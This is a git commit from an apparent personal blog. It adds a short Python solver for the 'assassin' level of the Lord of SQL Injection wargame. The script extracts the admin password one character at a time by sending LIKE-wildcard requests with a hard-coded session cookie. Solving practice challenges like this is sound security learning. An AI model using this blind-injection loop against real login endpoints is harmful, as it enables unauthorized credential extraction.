fbf75122fc59347b657795a9de06adb799c58a25
AR3CIA <dalus518@naver.com>
2024-11-10 04:36:03 +0900

    2024-11-10 blog update

---
+++ _posts/codes/Assassin.py
@@ -0,0 +1,28 @@
+import requests as r
+
+url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
+cookie = {"PHPSESSID" : 'ovbfdu14h0vaeamskdlr10nttu'}
+
+result_pw = ''
+
+cash = ''
+cash_1 = ''
+for i in range(8):
+    if not cash_1:
+        result_pw += cash
+        cash = ''
+        cash_1 = ''
+    for pw in range(ord('0'), ord('z')):
+        param = {'pw': f'{result_pw+chr(pw)}%'}
+        res = r.get(url,params=param, cookies=cookie)
+        if not "<hr><br><code>" in res.text:
+            if "Hello admin" in res.text: # Hello admin | Hello guest를 바꿔가며 pw를 알아낼 수 있음
+                if chr(pw) != '_':
+                    cash = chr(pw)
+            else:
+                cash_1 = chr(pw)
+                result_pw += chr(pw)
+                break
+    print(f'{i+1} : {result_pw}')
+
+print(result_pw.lower())
